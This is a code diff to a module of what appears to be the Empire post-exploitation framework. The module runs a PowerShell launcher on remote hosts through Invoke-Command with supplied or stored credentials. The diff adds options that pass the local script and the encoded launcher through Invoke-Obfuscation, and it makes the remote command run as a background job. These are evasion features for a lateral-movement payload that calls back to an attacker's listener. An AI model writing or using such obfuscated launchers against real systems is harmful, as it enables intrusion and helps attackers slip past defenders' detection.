@@ -74,6 +74,26 @@ class Module:
                 'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                 'Required'      :   False,
                 'Value'         :   'default'
+            },
+            'Obfuscate' : {
+                'Description'   :   'Switch. Obfuscate the local powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
+                'Required'      :   False,
+                'Value'         :   False
+            },
+            'ObfuscationCommand' : {
+                'Description'   :   'The Invoke-Obfuscation command to use for obfuscation. Only used if Obfuscate switch is True. For powershell only.',
+                'Required'      :   False,
+                'Value'         :   'Token\All\\1,Launcher\STDIN++\\12467'
+            },
+            'LauncherObfuscate' : {
+                'Description'   :   'Switch. Obfuscate the launcher powershell code, uses the LauncherObfuscateCommand for obfuscation types. For powershell only.',
+                'Required'      :   False,
+                'Value'         :   False
+            },
+            'LauncherObfuscationCommand' : {
+                'Description'   :   'The Invoke-Obfuscation command to use for launcher obfuscation. Only used if LauncherObfuscate switch is True. For powershell only.',
+                'Required'      :   False,
+                'Value'         :   'Token\All\\1,Launcher\STDIN++\\12467'
             }
         }
 
@@ -94,10 +114,12 @@ class Module:
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
-        userName = self.options['UserName']['Value']
-        password = self.options['Password']['Value']
+        obfuscate = self.options['Obfuscate']['Value']
+        obfuscationCommand = self.options['ObfuscationCommand']['Value']
+        launcherObfuscate = self.options['LauncherObfuscate']['Value']
+        launcherObfuscationCommand = self.options['LauncherObfuscationCommand']['Value']
 
-        script = """Invoke-Command """
+        script = """Invoke-Command -AsJob """
 
         # if a credential ID is specified, try to parse
         credID = self.options["CredID"]['Value']
@@ -112,6 +134,8 @@ class Module:
             self.options["UserName"]['Value'] = str(domainName) + "\\" + str(userName)
             self.options["Password"]['Value'] = password
 
+        userName = self.options['UserName']['Value']
+        password = self.options['Password']['Value']
 
         if not self.mainMenu.listeners.is_listener_valid(listenerName):
             # not a valid listener, return nothing for the script
@@ -120,7 +144,7 @@ class Module:
 
         else:
             # generate the PowerShell one-liner with all of the proper options set
-            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, obfuscate=launcherObfuscate, obfuscationCommand=launcherObfuscationCommand)
                 
             if launcher == "":
                 return ""
